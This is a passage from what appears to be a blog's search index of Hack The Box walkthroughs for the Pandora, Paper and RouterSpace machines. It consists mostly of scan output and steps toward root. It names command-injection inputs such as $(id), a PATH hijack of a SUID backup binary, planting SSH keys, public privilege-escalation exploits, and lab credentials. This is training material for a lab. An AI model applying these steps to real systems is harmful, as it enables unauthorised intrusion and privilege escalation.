/etc/apache2/sites-enabled/pandora.conf \u0026lt;VirtualHost localhost:80\u0026gt; ServerAdmin admin@panda.htb ServerName pandora.panda.htb DocumentRoot /var/www/pandora AssignUserID matt matt \u0026lt;Directory /var/www/pandora\u0026gt; AllowOverride All \u0026lt;/Directory\u0026gt; ErrorLog /var/log/apache2/error.log CustomLog /var/log/apache2/access.log combined \u0026lt;/VirtualHost\u0026gt; It\u0026rsquo;s set to listen to localhost:80, so I need to set port forwarding Reconnect with ssh -L 8000:localhost:80 daniel@10.10.11.136 Set pandora.panda.htb to 127.0.0.1 in /etc/hosts If we visit pandora.panda.htb:8000, we have Pandora FMS with version v7.0NG.742_FIX_PERL2020 Googling revealed 2 possible paths I need creds to perform CVE-2020-5844 or CVE-2021-32099 Since I don\u0026rsquo;t have creds, let\u0026rsquo;s go with second option https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated You might need to modify port number in the poc to make it work I created a launched revshell using the uploaded file from the poc Root Enumerate SUID binaries matt@pandora:/home/matt$ find / -perm -4000 -ls 2\u0026gt;/dev/null 264644 164 -rwsr-xr-x 1 root root 166056 Jan 19 2021 /usr/bin/sudo 265010 32 -rwsr-xr-x 1 root root 31032 May 26 2021 /usr/bin/pkexec 267386 84 -rwsr-xr-x 1 root root 85064 Jul 14 2021 /usr/bin/chfn 262764 44 -rwsr-xr-x 1 root root 44784 Jul 14 2021 /usr/bin/newgrp 267389 88 -rwsr-xr-x 1 root root 88464 Jul 14 2021 /usr/bin/gpasswd 264713 40 -rwsr-xr-x 1 root root 39144 Jul 21 2020 /usr/bin/umount 262929 20 -rwsr-x--- 1 root matt 16816 Dec 3 2021 /usr/bin/pandora_backup 267390 68 -rwsr-xr-x 1 root root 68208 Jul 14 2021 /usr/bin/passwd 264371 56 -rwsr-xr-x 1 root root 55528 Jul 21 2020 /usr/bin/mount 264643 68 -rwsr-xr-x 1 root root 67816 Jul 21 2020 /usr/bin/su 264040 56 -rwsr-sr-x 1 daemon daemon 55560 Nov 12 2018 /usr/bin/at 264219 40 -rwsr-xr-x 1 root root 39144 Mar 7 2020 /usr/bin/fusermount 267387 52 -rwsr-xr-x 1 root root 53040 Jul 14 2021 /usr/bin/chsh 262815 464 -rwsr-xr-x 1 root root 473576 Jul 23 2021 /usr/lib/openssh/ssh-keysign 264920 52 -rwsr-xr-- 1 root messagebus 51344 Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper 264927 16 -rwsr-xr-x 1 root root 14488 Jul 8 2019 /usr/lib/eject/dmcrypt-get-device 266611 24 -rwsr-xr-x 1 root root 22840 May 26 2021 /usr/lib/policykit-1/polkit-agent-helper-1 We see /usr/bin/pandora_backup If I try to run it from revshell it fails Let\u0026rsquo;s add our public key to authorized_keys Now let\u0026rsquo;s try executing /usr/bin/pandora_backup again It works If I run it using ltrace it fails It drops SUID bit But we see that tar is called without full path So we might have a path injection matt@pandora:~$ ltrace /usr/bin/pandora_backup getuid() = 1000 geteuid() = 1000 setreuid(1000, 1000) = 0 puts(\u0026#34;PandoraFMS Backup Utility\u0026#34;PandoraFMS Backup Utility ) = 26 puts(\u0026#34;Now attempting to backup Pandora\u0026#34;...Now attempting to backup PandoraFMS client ) = 43 system(\u0026#34;tar -cvf /root/.backup/pandora-b\u0026#34;...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied tar: Error is not recoverable: exiting now \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 512 puts(\u0026#34;Backup failed!\\nCheck your permis\u0026#34;...Backup failed! Check your permissions! ) = 39 +++ exited (status 1) +++ I created tar script in /tmp folder and added /tmp to PATH Then executed /usr/bin/pandora_backup from /tmp Rooted ","date":"August 18, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/pandora/images/pandora.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/pandora/","summary":"Pandora Enumeration nmap â””â”€$ nmap -sV -sC -Pn 10.10.11.136 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 19:34 BST Warning: 10.10.11.136 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.11.136 (10.10.11.136) Host is up (0.15s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) |_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","vhosts","snmp","snmpwalk","snmpbulkwalk","pandora-fms","cve-2021-32099","sqli injection","sqli-union","auth-bypass","command-injection","upload","webshell","path-hijack","apache"],"title":"[HTB] Machine: Pandora"},{"categories":null,"contents":"Paper Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.143 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 19:40 BST Nmap scan report for 10.10.11.143 (10.10.11.143) Host is up (0.14s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) |_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 |_http-title: HTTP Server Test Page powered by CentOS 443/tcp open ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_ssl-date: TLS randomness does not represent time |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US | Subject Alternative Name: DNS:localhost.localdomain | Not valid before: 2021-07-03T08:52:34 |_Not valid after: 2022-07-08T10:32:34 | tls-alpn: |_ http/1.1 |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | http-methods: |_ Potentially risky methods: TRACE Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.73 seconds Web Server gobuster â””â”€$ gobuster dir -u http://office.paper -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://office.paper [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/19 12:43:46 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 301) [Size: 1] [--\u0026gt; http://office.paper/] /wp-content (Status: 301) [Size: 239] [--\u0026gt; http://office.paper/wp-content/] /wp-login.php (Status: 200) [Size: 3344] /license.txt (Status: 200) [Size: 19935] /manual (Status: 301) [Size: 235] [--\u0026gt; http://office.paper/manual/] /wp-includes (Status: 301) [Size: 240] [--\u0026gt; http://office.paper/wp-includes/] /wp-trackback.php (Status: 200) [Size: 136] /wp-admin (Status: 301) [Size: 237] [--\u0026gt; http://office.paper/wp-admin/] ffuf â””â”€$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u \u0026#39;http://office.paper/\u0026#39; -H \u0026#39;Host: FUZZ.office.paper\u0026#39; -fs 199691 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://office.paper/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.office.paper :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 199691 ________________________________________________ [Status: 200, Size: 223163, Words: 13014, Lines: 508, Duration: 968ms] * FUZZ: chat chat.office.paper wpscan shows ... [+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04). | Found By: Rss Generator (Passive Detection) | - http://office.paper/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.2.3\u0026lt;/generator\u0026gt; | - http://office.paper/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.2.3\u0026lt;/generator\u0026gt; ... Foothold/User Wordpress is vulnerable to CVE-2019-17671 https://www.exploit-db.com/exploits/47690 Let\u0026rsquo;s register a user http://chat.office.paper/register/8qozr226AhkCHZdyY Let\u0026rsquo;s observer the chat We see the bot We can read files We have 2 users If we list the contents of the parent directory we see that it\u0026rsquo;s dwight\u0026rsquo;s home directory We can start scavenging we see hubot directory Inside the hubot\u0026rsquo;s directory we have .env file which might hold some secrets And we have some creds Queenofblad3s!23 Let\u0026rsquo;s try using found creds ssh Success Root Let\u0026rsquo;s enumerate via linpeas So the box is vulnerable to CVE-2021-3560 Download poc and execute it secnigma:secnigmaftw ","date":"August 18, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/paper/images/paper.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/paper/","summary":"Paper Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.143 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 19:40 BST Nmap scan report for 10.10.11.143 (10.10.11.143) Host is up (0.14s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) |_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.","tags":["HTB","vhosts","wordpress","wpscan","rocket-chat","cve-2019-17671","directory-traversal","linpeas","cve-2021-3560"],"title":"[HTB] Machine: Paper"},{"categories":null,"contents":"RouterSpace Enumeration nmap â””â”€$ nmap -p- -Pn 10.10.11.148 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 18:28 BST Nmap scan report for 10.10.11.148 (10.10.11.148) Host is up (0.093s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http â””â”€$ nmap -sC -sV -p22,80 -Pn 10.10.11.148 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 18:31 BST Nmap scan report for 10.10.11.148 (10.10.11.148) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh (protocol 2.0) | ssh-hostkey: | 3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA) | 256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA) |_ 256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519) | fingerprint-strings: | NULL: |_ SSH-2.0-RouterSpace Packet Filtering V1 80/tcp open http |_http-trane-info: Problem with XML parsing of /evox/about |_http-title: RouterSpace | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-69342 | Content-Type: text/html; charset=utf-8 | Content-Length: 69 | ETag: W/\u0026#34;45-ArZPh2MVSQ5dJi57+Br7WSwnuzQ\u0026#34; | Date: Thu, 24 Aug 2023 17:31:28 GMT | Connection: close | Suspicious activity detected !!! {RequestID: 2Zrpn mtt nnCy S } | GetRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-21663 | Accept-Ranges: bytes | Cache-Control: public, max-age=0 | Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT | ETag: W/\u0026#34;652c-17d476c9285\u0026#34; | Content-Type: text/html; charset=UTF-8 | Content-Length: 25900 | Date: Thu, 24 Aug 2023 17:31:26 GMT | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html class=\u0026#34;no-js\u0026#34; lang=\u0026#34;zxx\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;x-ua-compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;RouterSpace\u0026lt;/title\u0026gt; | \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/owl.carousel.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/magnific-popup.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/themify-icons.css\u0026#34;\u0026gt; | HTTPOptions: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-53822 | Allow: GET,HEAD,POST | Content-Type: text/html; charset=utf-8 | Content-Length: 13 | ETag: W/\u0026#34;d-bMedpZYGrVt1nR4x+qdNZ2GqyRo\u0026#34; | Date: Thu, 24 Aug 2023 17:31:26 GMT | Connection: close | GET,HEAD,POST | RTSPRequest, X11Probe: | HTTP/1.1 400 Bad Request |_ Connection: close 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port22-TCP:V=7.94%I=7%D=8/24%Time=64E79412%P=x86_64-pc-linux-gnu%r(NULL SF:,29,\u0026#34;SSH-2\\.0-RouterSpace\\x20Packet\\x20Filtering\\x20V1\\r\\n\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port80-TCP:V=7.94%I=7%D=8/24%Time=64E79412%P=x86_64-pc-linux-gnu%r(GetR SF:equest,14B8,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\n SF:X-Cdn:\\x20RouterSpace-21663\\r\\nAccept-Ranges:\\x20bytes\\r\\nCache-Control SF::\\x20public,\\x20max-age=0\\r\\nLast-Modified:\\x20Mon,\\x2022\\x20Nov\\x20202 SF:1\\x2011:33:57\\x20GMT\\r\\nETag:\\x20W/\\\u0026#34;652c-17d476c9285\\\u0026#34;\\r\\nContent-Type SF::\\x20text/html;\\x20charset=UTF-8\\r\\nContent-Length:\\x2025900\\r\\nDate:\\x SF:20Thu,\\x2024\\x20Aug\\x202023\\x2017:31:26\\x20GMT\\r\\nConnection:\\x20close\\ SF:r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\\n\u0026lt;html\\x20class=\\\u0026#34;no-js\\\u0026#34;\\x20lang=\\\u0026#34;zxx\\\u0026#34;\u0026gt;\\n\u0026lt; SF:head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;me SF:ta\\x20http-equiv=\\\u0026#34;x-ua-compatible\\\u0026#34;\\x20content=\\\u0026#34;ie=edge\\\u0026#34;\u0026gt;\\n\\x20\\x20\\ SF:x20\\x20\u0026lt;title\u0026gt;RouterSpace\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20name=\\\u0026#34;desc SF:ription\\\u0026#34;\\x20content=\\\u0026#34;\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\ SF:x20content=\\\u0026#34;width=device-width,\\x20initial-scale=1\\\u0026#34;\u0026gt;\\n\\n\\x20\\x20\\x20\\ SF:x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/bootstrap\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x SF:20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/owl\\.carousel\\. SF:min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/ SF:magnific-popup\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20 SF:href=\\\u0026#34;css/font-awesome\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;st SF:ylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/themify-icons\\.css\\\u0026#34;\u0026gt;\\n\\x20\u0026#34;)%r(HTTPOptions,10 SF:8,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20 SF:RouterSpace-53822\\r\\nAllow:\\x20GET,HEAD,POST\\r\\nContent-Type:\\x20text/h SF:tml;\\x20charset=utf-8\\r\\nContent-Length:\\x2013\\r\\nETag:\\x20W/\\\u0026#34;d-bMedpZ SF:YGrVt1nR4x\\+qdNZ2GqyRo\\\u0026#34;\\r\\nDate:\\x20Thu,\\x2024\\x20Aug\\x202023\\x2017:31 SF::26\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nGET,HEAD,POST\u0026#34;)%r(RTSPRequest SF:,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n SF:\u0026#34;)%r(X11Probe,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20 SF:close\\r\\n\\r\\n\u0026#34;)%r(FourOhFourRequest,12B,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Po SF:wered-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20RouterSpace-69342\\r\\nContent-Type SF::\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2069\\r\\nETag:\\x20W SF:/\\\u0026#34;45-ArZPh2MVSQ5dJi57\\+Br7WSwnuzQ\\\u0026#34;\\r\\nDate:\\x20Thu,\\x2024\\x20Aug\\x202 SF:023\\x2017:31:28\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nSuspicious\\x20act SF:ivity\\x20detected\\x20!!!\\x20{RequestID:\\x202Zrpn\\x20mtt\\x20\\x20nnCy\\x20 SF:\\x20\\x20\\x20S\\x20}\\n\\n\u0026#34;); Web server If we visit http://10.10.11.148/RouterSpace.apk, it downloads RouterSpace.apk file Directory brute forcing I had issues with filtering bad responses, but eventually managed to do it using feroxbuster feroxbuster â””â”€$ feroxbuster -u http://10.10.11.148/ -n -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -X \u0026#39;Suspicious activity detected !!!\u0026#39; ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher ðŸ¤“ ver: 2.10.0 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸŽ¯ Target Url â”‚ http://10.10.11.148/ ðŸš€ Threads â”‚ 50 ðŸ“– Wordlist â”‚ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt ðŸ‘Œ Status Codes â”‚ All Status Codes! ðŸ’¥ Timeout (secs) â”‚ 7 ðŸ¦¡ User-Agent â”‚ feroxbuster/2.10.0 ðŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml ðŸ’¢ Regex Filter â”‚ Suspicious activity detected !!! ðŸ”Ž Extract Links â”‚ true ðŸ HTTP methods â”‚ [GET] ðŸš« Do Not Recurse â”‚ true â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ Press [ENTER] to use the Scan Management Menuâ„¢ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 301 GET 10l 16w 173c http://10.10.11.148/img =\u0026gt; http://10.10.11.148/img/ 200 GET 3l 215w 8636c http://10.10.11.148/js/vendor/modernizr-3.5.0.min.js 200 GET 119l 179w 1776c http://10.10.11.148/css/slick.css 200 GET 85l 206w 3024c http://10.10.11.148/js/contact.js 200 GET 129l 316w 3697c http://10.10.11.148/js/scrollIt.js 200 GET 8l 165w 8044c http://10.10.11.148/js/waypoints.min.js 200 GET 43l 251w 10237c http://10.10.11.148/img/ilstrator/app.svg 200 GET 7l 110w 5594c http://10.10.11.148/js/imagesloaded.pkgd.min.js 200 GET 7l 58w 1014c http://10.10.11.148/img/icon/2.svg 200 GET 2l 132w 8415c http://10.10.11.148/js/wow.min.js 200 GET 6l 64w 2936c http://10.10.11.148/css/owl.carousel.min.css 200 GET 120l 339w 4820c http://10.10.11.148/js/jquery.ajaxchimp.min.js 200 GET 31l 113w 1230c http://10.10.11.148/js/mail-script.js 200 GET 7l 29w 2035c http://10.10.11.148/js/jquery.scrollUp.min.js 200 GET 140l 345w 3639c http://10.10.11.148/css/nice-select.css 200 GET 24l 88w 760c http://10.10.11.148/js/plugins.js 200 GET 10l 42w 946c http://10.10.11.148/img/icon/1.svg 200 GET 4l 42w 2942c http://10.10.11.148/js/nice-select.min.js 200 GET 4l 25w 612c http://10.10.11.148/img/icon/3.svg 200 GET 56l 99w 1288c http://10.10.11.148/css/flaticon.css 200 GET 6l 102w 8415c http://10.10.11.148/js/jquery.slicknav.min.js 200 GET 8l 36w 1067c http://10.10.11.148/js/jquery.counterup.min.js 200 GET 14l 60w 4430c http://10.10.11.148/img/logo.png 200 GET 252l 591w 5521c http://10.10.11.148/css/slicknav.css 200 GET 48l 136w 1202c http://10.10.11.148/js/ajax-form.js 200 GET 351l 795w 6951c http://10.10.11.148/css/magnific-popup.css 200 GET 415l 791w 8467c http://10.10.11.148/js/main.js 200 GET 2l 364w 21068c http://10.10.11.148/js/jquery.validate.min.js 200 GET 4l 212w 20216c http://10.10.11.148/js/jquery.magnific-popup.min.js 200 GET 536l 1382w 25900c http://10.10.11.148/index.html 200 GET 113l 660w 51428c http://10.10.11.148/img/ilstrator_img/man_walk.png 200 GET 99l 523w 41442c http://10.10.11.148/img/ilstrator_img/draw.png 200 GET 12l 559w 35503c http://10.10.11.148/js/isotope.pkgd.min.js 200 GET 8l 31w 21879c http://10.10.11.148/img/ilstrator/play.svg 200 GET 4l 66w 31000c http://10.10.11.148/css/font-awesome.min.css 200 GET 1081l 1809w 16456c http://10.10.11.148/css/themify-icons.css 200 GET 5l 351w 19188c http://10.10.11.148/js/popper.min.js 200 GET 1174l 4381w 41095c http://10.10.11.148/js/jquery.form.js 200 GET 2704l 5500w 57523c http://10.10.11.148/css/gijgo.css 200 GET 7l 567w 48944c http://10.10.11.148/js/bootstrap.min.js 200 GET 7l 279w 42766c http://10.10.11.148/js/owl.carousel.min.js 200 GET 3188l 6010w 68701c http://10.10.11.148/css/animate.min.css 200 GET 5l 1434w 97163c http://10.10.11.148/js/vendor/jquery-1.12.4.min.js 200 GET 7057l 20844w 196023c http://10.10.11.148/css/style.css 200 GET 685l 4128w 324570c http://10.10.11.148/img/ilstrator_img/phone.png 200 GET 9273l 15721w 187832c http://10.10.11.148/css/bootstrap.min.css 200 GET 1l 2188w 177487c http://10.10.11.148/js/gijgo.min.js 200 GET 840l 5012w 388559c http://10.10.11.148/img/ilstrator/phone.png 200 GET 902l 5006w 440714c http://10.10.11.148/img/ilstrator_img/mobile_screen.png 200 GET 0l 0w 35855082c http://10.10.11.148/RouterSpace.apk 200 GET 536l 1382w 25900c http://10.10.11.148/ 301 GET 10l 16w 173c http://10.10.11.148/css =\u0026gt; http://10.10.11.148/css/ 301 GET 10l 16w 171c http://10.10.11.148/js =\u0026gt; http://10.10.11.148/js/ 301 GET 10l 16w 177c http://10.10.11.148/fonts =\u0026gt; http://10.10.11.148/fonts/ Foothold/User Let\u0026rsquo;s analyze the apk We can perform static analysis using jadx You can also do it using apktool We see the domain information in apk\u0026rsquo;s signature Checking AndroidManifest.xml shows the main function The main activity has only 2 functions: constructor and GetMainComponentName So let\u0026rsquo;s perform dynamic analysis I installed Genymotion to do that This ippsec\u0026rsquo;s video can be helpful Let\u0026rsquo;s create Android Device Install apk by dragging it to Android Device screen Now I need to configure Android Device to send requests to Burp Suite Open Android Settings (or the gear icon in top menu) Then select Network \u0026amp; Internet -\u0026gt; Wi-Fi and then click and hold AndroidWifi until menu with Modify Network pops up Select Modify Network and then click Advanced options Change Proxy settings to Manual Set IP to your host\u0026rsquo;s IP Set port to 8080 (Burp\u0026rsquo;s default port) Now change Burp\u0026rsquo;s settings Proxy Settings -\u0026gt; Tools -\u0026gt; Proxy -\u0026gt; Proxy Listeners -\u0026gt; Edit Running Listener and change Bind to address to All interfaces Open browser in Android Device and try opening any link Burp should intercept the request Now we have everything configured, so let\u0026rsquo;s open apk and click Check Status We see the requests to routerspace.htb, so we need to add it to /etc/hosts (I\u0026rsquo;m running Genymotion on Windows, so had to add it to C:\\Windows\\System32\\drivers\\etc\\hosts) Now let\u0026rsquo;s click Check Status again Now we received the response Changing ip and sending request basically returns back the ip We can play with the payload But when I send command injection payload: \u0026ldquo;`id`\u0026rdquo; or $(id), we have rce I couldn\u0026rsquo;t get reverse shell, so I grabbed the flag first to proceed with other ideas Now let\u0026rsquo;s add our key to authorized_keys We have a .ssh directory Create an authorized_keys and add key to it Connect via ssh Root Send linpeas via scp Enumerate Pwnkit won\u0026rsquo;t work since it requires SUID bit set to pkexec Let\u0026rsquo;s try Baron Samedit First let\u0026rsquo;s test by running sudoedit -s Y, if it asks for passwords it\u0026rsquo;s most likely vulnerable According to https://github.com/CptGibbon/CVE-2021-3156 paul@routerspace:/tmp$ sudoedit -s Y [sudo] password for paul: Now upload repository using scp -r And compile it using make Run the exploit and get the flag ","date":"August 18, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/routerspace/images/routerspace.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/routerspace/","summary":"RouterSpace Enumeration nmap â””â”€$ nmap -p- -Pn 10.10.11.148 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 18:28 BST Nmap scan report for 10.10.11.148 (10.10.11.148) Host is up (0.093s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http â””â”€$ nmap -sC -sV -p22,80 -Pn 10.10.11.148 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 18:31 BST Nmap scan report for 10.10.11.148 (10.10.11.148) Host is up (0.","tags":["HTB","android","apk","feroxbuster","apktool","reverse-engineering","android-react-native","react-native","genymotion","burp","android-burp","command-injection","linpeas","pwnkit","cve-2021-4034","baron-samedit","cve-2021-3156"],"title":"[HTB] Machine: RouterSpace"},{"categories":null,"contents":"SteamCloud Enumeration nmap â””â”€$ nmap -p- -Pn 10.10.11.133 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 17:58 BST Nmap scan report for 10.10.11.133 (10.10.11.133) Host is up (0.15s latency). Not shown: 65528 closed 